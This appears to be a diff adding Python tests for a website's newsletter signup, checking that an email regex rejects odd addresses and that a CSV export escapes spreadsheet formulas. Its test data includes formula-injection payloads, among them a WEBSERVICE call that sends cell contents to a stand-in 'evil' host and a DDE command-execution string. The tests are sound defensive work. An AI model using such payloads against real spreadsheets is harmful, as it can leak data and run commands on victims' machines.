@@ -244,3 +244,51 @@ def test_schema_validation_rejects_injection(server, mutate):
     schema = json.loads(STRUCTURE_JSON.read_text(encoding="utf-8"))
     mutate(schema)
     assert server._validate_schema_doc(schema)
+
+
+# ── newsletter ─────────────────────────────────────────────────
+
+
+@pytest.mark.parametrize(
+    "email",
+    [
+        '=WEBSERVICE("http://evil/"&A2)@x.de',
+        "+cmd|' /C calc'!A0@x.de",
+        "-2+3@x.de",
+        "@SUM(1+1)@x.de",
+        "a b@x.de",
+        'a"b@x.de',
+        "a@x",
+    ],
+)
+def test_newsletter_rejects_formula_and_odd_emails(server, email):
+    assert server._EMAIL_RE.fullmatch(email) is None
+
+
+@pytest.mark.parametrize("email", ["max.mustermann@tuhh.de", "a+tag@mail.example.org", "x_y-z@sub.domain.co"])
+def test_newsletter_accepts_normal_emails(server, email):
+    assert server._EMAIL_RE.fullmatch(email)
+
+
+def test_csv_export_neutralises_formulas():
+    sys.path.insert(0, str(SERVER_DIR))
+    try:
+        from newsletter_decrypt import csv_safe
+    finally:
+        sys.path.remove(str(SERVER_DIR))
+    assert csv_safe('=HYPERLINK("http://evil")') == '\'=HYPERLINK("http://evil")'
+    assert csv_safe("+1") == "'+1" and csv_safe("-1") == "'-1" and csv_safe("@a") == "'@a"
+    assert csv_safe("a@b.de") == "a@b.de"
+
+
+def test_allowed_options_json_is_up_to_date():
+    import shutil
+    import subprocess
+
+    node = shutil.which("node")
+    if node is None:
+        pytest.skip("node not available")
+    r = subprocess.run(
+        [node, str(ROOT / "tools" / "gen_allowed_options.mjs"), "--check"], capture_output=True, text=True
+    )
+    assert r.returncode == 0, r.stderr
